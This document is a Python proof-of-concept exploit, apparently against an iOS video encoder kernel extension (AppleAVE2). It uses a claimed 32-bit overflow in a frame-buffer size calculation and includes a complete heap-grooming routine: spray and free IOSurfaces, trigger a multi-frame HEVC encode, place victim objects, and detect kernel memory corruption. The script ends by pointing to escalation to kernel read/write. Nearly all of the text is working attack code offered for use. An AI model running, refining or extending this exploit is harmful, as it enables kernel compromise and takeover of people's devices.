"""
AVE2 DPB overflow heap groom PoC  —  v4 (corrected)
Target: iOS 26.6.1 (iPhone17,4) — AppleAVE2 kext

Root cause: DPB buffer size = DPB_unit * NTL computed in 32-bit.
  DPB_unit = 60 * 34 * 1024 = 2,088,960 bytes  (4K HEVC, 64px CTU)
  NTL=2057: 2,088,960 * 2057 = 4,296,990,720 → wraps to 2,023,424 bytes
  Firmware allocates ~1.93 MB but writes as if buffer is ~4.3 GB → OOB write.

Key corrections vs v1:
  1. IOSurfaceRelease absent on iOS 26.6.1 → use CF.CFRelease (CFTypeRef compat)
  2. Single frame only writes DPB[0] at offset 0 (in-bounds, no OOB).
     Need 2+ frames: frame 1 writes DPB[1] at offset 2,088,960 > 2,023,424 → OOB.
  3. Feeder pattern: FREE ALL spray, trigger encode (DPB claims freed pages, 20ms),
     THEN allocate victims. Old pattern (spray→free half→victims→trigger) filled
     all holes before triggering so DPB went to new memory.
  4. VTCompressionSessionInvalidate hangs indefinitely after multi-frame NTL=2057
     encode (firmware waiting for GOP). Do NOT call it.
  5. Actual IOSurface allocation = 2,031,616 bytes (16KB aligned, not 2,023,424).
     Victim starts 8,192 bytes after DPB's physical end. DPB still writes into
     the victim's first 8192-byte gap at frame 1 offset; victim header should be hit.

Feeder pattern timing:
  Free all spray  →  queue 5 frames  →  sleep 20ms (DPB claims freed pages)
  →  allocate victims (land immediately after DPB in physical address space)

Run conditions: fresh reboot, memory < 1400 MB baseline, all background apps closed.
AppGroup UUID: 92767569-346F-4ECE-B7F6-8107C7A21B5B
"""

import ctypes as C, sys, os, time, resource

APPGROUP = (
    "/private/var/mobile/Containers/Shared/AppGroup"
    "/92767569-346F-4ECE-B7F6-8107C7A21B5B/Library"
)
LOG_FILE = f"{APPGROUP}/ave2_groom_v4.txt"

GROOM_SIZE    = 2_023_424   # (DPB_unit * 2057) & 0xFFFFFFFF — exact wrapped DPB alloc
SPRAY_COUNT   = 16          # all freed before encode (feeder pattern), 32 MB total
VICTIM_COUNT  = 16          # placed after DPB claims freed pages
NUM_FRAMES    = 5           # frame 0 is in-bounds; frames 1-4 trigger DPB[1-4] OOB writes
DPB_WAIT_S    = 0.020       # 20ms: let DPB claim freed pages before victims land
OOB_WAIT_S    = 12.0        # 12s poll window for OOB write to complete
NTL_TRIGGER   = 2057        # first true 32-bit overflow

WIDTH, HEIGHT = 3840, 2160  # 4K HEVC
kHEVC         = 0x68766331  # 'hvc1'
kCV420v       = 0x34323076  # kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange
CTU_W         = (WIDTH  + 63) // 64   # = 60
CTU_H         = (HEIGHT + 63) // 64   # = 34
DPB_UNIT      = CTU_W * CTU_H * 1024  # = 2,088,960

kCFNumberSInt64Type   = 4
kCFStringEncodingUTF8 = 0x08000100

# ------------------------------------------------------------------ logging --

def log(msg):
    ts = time.strftime("%H:%M:%S")
    line = f"[{ts}] {msg}\n"
    sys.stdout.write(line); sys.stdout.flush()
    try:
        with open(LOG_FILE, "a") as f:
            f.write(line); f.flush(); os.fsync(f.fileno())
    except Exception as e:
        sys.stdout.write(f"[LOG_ERR] {e}\n"); sys.stdout.flush()

# ---------------------------------------------------------------- frameworks --

CF = C.CDLL("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation")
VT = C.CDLL("/System/Library/Frameworks/VideoToolbox.framework/VideoToolbox")
CV = C.CDLL("/System/Library/Frameworks/CoreVideo.framework/CoreVideo")
IS = C.CDLL("/System/Library/Frameworks/IOSurface.framework/IOSurface")

# CoreFoundation
CF.CFStringCreateWithCString.restype  = C.c_void_p
CF.CFStringCreateWithCString.argtypes = [C.c_void_p, C.c_char_p, C.c_uint32]
CF.CFNumberCreate.restype  = C.c_void_p
CF.CFNumberCreate.argtypes = [C.c_void_p, C.c_int, C.c_void_p]
CF.CFDictionaryCreate.restype  = C.c_void_p
CF.CFDictionaryCreate.argtypes = [
    C.c_void_p, C.POINTER(C.c_void_p), C.POINTER(C.c_void_p),
    C.c_long, C.c_void_p, C.c_void_p,
]
CF.CFRelease.argtypes = [C.c_void_p]

# IOSurface  (IOSurfaceRelease absent on iOS 26.6.1 — use CFRelease instead)
IS.IOSurfaceCreate.restype        = C.c_void_p
IS.IOSurfaceCreate.argtypes       = [C.c_void_p]
IS.IOSurfaceGetAllocSize.restype  = C.c_size_t
IS.IOSurfaceGetAllocSize.argtypes = [C.c_void_p]
IS.IOSurfaceGetID.restype         = C.c_uint32
IS.IOSurfaceGetID.argtypes        = [C.c_void_p]

# CoreVideo
CV.CVPixelBufferCreate.restype  = C.c_int32
CV.CVPixelBufferCreate.argtypes = [
    C.c_void_p, C.c_ulong, C.c_ulong, C.c_uint32,
    C.c_void_p, C.POINTER(C.c_void_p),
]
CV.CVPixelBufferRelease.argtypes = [C.c_void_p]

# VideoToolbox
VT.VTCompressionSessionCreate.restype  = C.c_int32
VT.VTCompressionSessionCreate.argtypes = [
    C.c_void_p, C.c_int32, C.c_int32, C.c_uint32,
    C.c_void_p, C.c_void_p, C.c_void_p, C.c_void_p, C.c_void_p,
    C.POINTER(C.c_void_p),
]
VT.VTSessionSetProperty.restype  = C.c_int32
VT.VTSessionSetProperty.argtypes = [C.c_void_p, C.c_void_p, C.c_void_p]
# NOTE: VTCompressionSessionInvalidate intentionally NOT called in this PoC.
# It hangs indefinitely after multi-frame NTL=2057 encode (firmware waiting for GOP).

class CMTime(C.Structure):
    _fields_ = [
        ("value", C.c_int64), ("timescale", C.c_int32),
        ("flags", C.c_uint32), ("epoch", C.c_int64),
    ]

VT.VTCompressionSessionEncodeFrame.restype  = C.c_int32
VT.VTCompressionSessionEncodeFrame.argtypes = [
    C.c_void_p, C.c_void_p, CMTime, CMTime,
    C.c_void_p, C.c_void_p, C.POINTER(C.c_uint32),
]

ENCODE_CB = C.CFUNCTYPE(None, C.c_void_p, C.c_void_p, C.c_int32, C.c_void_p, C.c_void_p)
@ENCODE_CB
def _output_cb(*a): pass

# ------------------------------------------------ CF dict helpers for IOSurface --

_kDictKeyCB = (C.c_uint8 * 64).in_dll(CF, "kCFTypeDictionaryKeyCallBacks")
_kDictValCB = (C.c_uint8 * 64).in_dll(CF, "kCFTypeDictionaryValueCallBacks")

_key_alloc_str = CF.CFStringCreateWithCString(None, b"IOSurfaceAllocSize", kCFStringEncodingUTF8)

def _make_surf_props(size):
    size_num = CF.CFNumberCreate(None, kCFNumberSInt64Type, C.byref(C.c_int64(size)))
    keys = (C.c_void_p * 1)(_key_alloc_str)
    vals = (C.c_void_p * 1)(size_num)
    d = CF.CFDictionaryCreate(
        None, keys, vals, 1,
        C.addressof(_kDictKeyCB), C.addressof(_kDictValCB),
    )
    CF.CFRelease(size_num)
    return d

def create_surf(size=GROOM_SIZE):
    props = _make_surf_props(size)
    if not props:
        return None
    surf = IS.IOSurfaceCreate(props)
    CF.CFRelease(props)
    return surf or None

def release_surf(s):
    if s:
        CF.CFRelease(s)   # IOSurfaceRelease absent on iOS 26.6.1; IOSurfaceRef is CFType-compatible

# ----------------------------------------------- multi-frame VT encode trigger --

def trigger_encode_multiframe(ntl, num_frames):
    """
    Create a VT session with the given NTL and queue num_frames frames.
    Frame 0 writes DPB[0] at offset 0 (in-bounds).
    Frame 1+ write DPB[1+] at offset n*DPB_UNIT > GROOM_SIZE → OOB write.
    Returns (session_ptr, status_msg).
    IMPORTANT: does NOT call VTCompressionSessionInvalidate — it hangs.
    """
    sess = C.c_void_p(0)
    st = VT.VTCompressionSessionCreate(
        None, WIDTH, HEIGHT, kHEVC,
        None, None, None, _output_cb, None, C.byref(sess)
    )
    if st != 0 or not sess.value:
        return None, f"session_fail({st:#x})"

    ntl_key = C.c_void_p.in_dll(VT, "kVTCompressionPropertyKey_NumberOfTemporalLayers").value
    ntl_val = CF.CFNumberCreate(None, kCFNumberSInt64Type, C.byref(C.c_int64(ntl)))
    st2 = VT.VTSessionSetProperty(sess.value, ntl_key, ntl_val)
    CF.CFRelease(ntl_val)
    if st2 != 0:
        return None, f"ntl_rejected({st2:#x})"

    for fi in range(num_frames):
        pbuf = C.c_void_p(0)
        st3 = CV.CVPixelBufferCreate(None, WIDTH, HEIGHT, kCV420v, None, C.byref(pbuf))
        if st3 != 0 or not pbuf.value:
            return sess.value, f"pixbuf_fail_at_frame_{fi}({st3:#x})"
        pts  = CMTime(value=fi * 3000, timescale=90000, flags=1, epoch=0)
        dur  = CMTime(value=3000,      timescale=90000, flags=1, epoch=0)
        info = C.c_uint32(0)
        st4  = VT.VTCompressionSessionEncodeFrame(
            sess.value, pbuf.value, pts, dur, None, None, C.byref(info)
        )
        CV.CVPixelBufferRelease(pbuf.value)
        log(f"  frame {fi}: encode_st={st4:#x}")

    return sess.value, f"queued {num_frames} frames"

# ================================================================ main groom ==

log("=" * 60)
log("AVE2 DPB groom PoC v4 — feeder pattern + multi-frame OOB")
log(f"GROOM_SIZE={GROOM_SIZE} ({GROOM_SIZE/1024/1024:.2f} MB)")
log(f"DPB_UNIT={DPB_UNIT}  NTL={NTL_TRIGGER}  FRAMES={NUM_FRAMES}")
log(f"overflow: {DPB_UNIT}*{NTL_TRIGGER}&0xffffffff = {(DPB_UNIT*NTL_TRIGGER)&0xFFFFFFFF}")
log(f"first OOB offset: DPB_UNIT={DPB_UNIT} > GROOM_SIZE={GROOM_SIZE} ✓")
log(f"SPRAY={SPRAY_COUNT}  VICTIMS={VICTIM_COUNT}  DPB_WAIT={DPB_WAIT_S*1000:.0f}ms  OOB_WAIT={OOB_WAIT_S}s")

rss = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
rss_mb = rss / (1024 * 1024)
log(f"Process RSS: {rss_mb:.0f} MB")
if rss_mb > 1300:
    log("WARNING: RSS > 1300 MB — high risk of jetsam during spray")

# ----------------------------------------------------------------- Phase 1: sanity
log("--- Phase 1: sanity check ---")
test = create_surf()
if not test:
    log("FATAL: IOSurfaceCreate returned NULL — IOSurface blocked from sandbox")
    sys.exit(1)
test_sz = IS.IOSurfaceGetAllocSize(test)
test_id = IS.IOSurfaceGetID(test)
log(f"test surf: ptr={test:#x}  alloc_size={test_sz}  id={test_id}")
if test_sz == 0:
    log("FATAL: GetAllocSize returned 0 — IOSurface header not accessible")
    release_surf(test)
    sys.exit(1)
actual_alloc = test_sz  # kernel rounds up: expect 2,031,616 (not 2,023,424)
if actual_alloc != GROOM_SIZE:
    log(f"NOTE: kernel rounded alloc {GROOM_SIZE} → {actual_alloc} ({actual_alloc - GROOM_SIZE} byte gap)")
release_surf(test)
log("sanity OK")

# ----------------------------------------------------------------- Phase 2: spray
log(f"--- Phase 2: spray {SPRAY_COUNT} surfaces (will all be freed as feeder) ---")
spray = []
for i in range(SPRAY_COUNT):
    s = create_surf()
    spray.append(s)
    if not s:
        log(f"WARNING: spray[{i}] = NULL (memory pressure)")
n_spray = sum(1 for s in spray if s)
log(f"sprayed {n_spray}/{SPRAY_COUNT} surfaces ({n_spray * actual_alloc / 1024 / 1024:.1f} MB)")

# ----------------------------------------------------------------- Phase 3: free ALL spray (feeder)
log("--- Phase 3: free ALL spray (feeder — creates large contiguous free zone) ---")
for i, s in enumerate(spray):
    release_surf(s)
spray = None
log("all spray freed — free zone ready for DPB")

# ----------------------------------------------------------------- Phase 4: encode (multi-frame, NTL=2057)
log(f"--- Phase 4: trigger NTL={NTL_TRIGGER} encode ({NUM_FRAMES} frames) ---")
t_encode = time.time()
sess, msg = trigger_encode_multiframe(NTL_TRIGGER, NUM_FRAMES)
t_encode_done = time.time()
log(f"encode result: {msg}  sess={sess:#x if sess else 0}  ({t_encode_done - t_encode:.2f}s)")
if not sess:
    log("FATAL: encode failed — aborting")
    sys.exit(1)

# ----------------------------------------------------------------- Phase 5: wait for DPB to claim pages
log(f"--- Phase 5: sleep {DPB_WAIT_S*1000:.0f}ms — let DPB allocate into freed pages ---")
time.sleep(DPB_WAIT_S)

# ----------------------------------------------------------------- Phase 6: victims (land right after DPB)
log(f"--- Phase 6: allocate {VICTIM_COUNT} victims (land in pages adjacent to DPB) ---")
victims = []
for i in range(VICTIM_COUNT):
    v = create_surf()
    victims.append(v)
    if not v:
        log(f"WARNING: victim[{i}] = NULL (memory pressure)")
n_victims = sum(1 for v in victims if v)
log(f"{n_victims}/{VICTIM_COUNT} victims allocated")

# ----------------------------------------------------------------- Phase 7: baselines
log("--- Phase 7: record victim baselines ---")
baseline = {}
for i, v in enumerate(victims):
    if v:
        sz  = IS.IOSurfaceGetAllocSize(v)
        sid = IS.IOSurfaceGetID(v)
        baseline[v] = (sz, sid)
log(f"baselines recorded for {len(baseline)} victims")

# ----------------------------------------------------------------- Phase 8: OOB wait with polling
log(f"--- Phase 8: wait {OOB_WAIT_S}s for OOB write to complete (polling every 2s) ---")
t0 = time.time()
found_early = False
while time.time() - t0 < OOB_WAIT_S:
    time.sleep(2.0)
    elapsed = time.time() - t0
    for i, v in enumerate(victims):
        if not v or v not in baseline:
            continue
        sz  = IS.IOSurfaceGetAllocSize(v)
        sid = IS.IOSurfaceGetID(v)
        bl_sz, bl_id = baseline[v]
        if sz != bl_sz or sid != bl_id:
            log(f"*** EARLY CORRUPTION at {elapsed:.1f}s: victim[{i:02d}] ptr={v:#x}  "
                f"alloc_size {bl_sz}→{sz}  id {bl_id}→{sid}")
            found_early = True
    if found_early:
        log("early corruption detected — breaking poll loop")
        break
    log(f"  poll at {elapsed:.1f}s — no corruption yet")

# ----------------------------------------------------------------- Phase 9: final scan
log("--- Phase 9: final scan ---")
corrupted_sz = []
corrupted_id = []

for i, v in enumerate(victims):
    if not v:
        continue
    sz  = IS.IOSurfaceGetAllocSize(v)
    sid = IS.IOSurfaceGetID(v)
    bl_sz, bl_id = baseline.get(v, (actual_alloc, 0))

    if sz != bl_sz or sid != bl_id:
        log(
            f"*** CORRUPTION victim[{i:02d}] ptr={v:#x}  "
            f"alloc_size {bl_sz}→{sz}  id {bl_id}→{sid}"
        )
        if sz != bl_sz:
            corrupted_sz.append(i)
        if sid != bl_id:
            corrupted_id.append(i)

if corrupted_sz or corrupted_id:
    log("=" * 60)
    log("KERNEL WRITE CONFIRMED")
    log(f"  alloc_size corrupted: {len(corrupted_sz)} victim(s) {corrupted_sz}")
    log(f"  surf_id    corrupted: {len(corrupted_id)} victim(s) {corrupted_id}")
    log("Next step: replace victim with pipe buffer → escalate to kernel R/W")
    log("=" * 60)
else:
    log("No corruption detected.")
    log("Possible reasons:")
    log("  - Groom miss: DPB landed outside victim range (try more spray)")
    log("  - 8192-byte gap between DPB end and victim: OOB may not reach victim header")
    log("  - alloc_size rounded differently: check test surf actual_alloc above")
    log("  - Firmware didn't write frame 1 yet: increase OOB_WAIT_S")
    log("  - Memory pressure: not enough victims landed adjacent to DPB")

# ----------------------------------------------------------------- Phase 10: cleanup
log("--- Phase 10: cleanup (surfaces only — NO VTInvalidate, it hangs) ---")
for v in victims:
    release_surf(v)
log("victims released")
log("NOTE: VT session left active (Invalidate hangs; firmware running in background)")

log("=== DONE ===")
